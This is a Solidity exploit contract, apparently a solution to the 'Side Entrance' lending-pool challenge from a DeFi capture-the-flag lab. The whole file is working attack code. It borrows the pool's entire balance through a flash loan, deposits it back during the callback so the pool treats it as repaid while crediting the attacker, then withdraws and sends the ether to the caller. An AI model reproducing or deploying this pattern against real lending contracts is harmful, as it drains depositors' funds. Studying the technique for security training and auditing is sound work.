// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract Attack {
    using Address for address payable;
    SideEntranceLenderPool pool;

    constructor(address Ipool) {
        pool = SideEntranceLenderPool(Ipool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute() external payable{
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
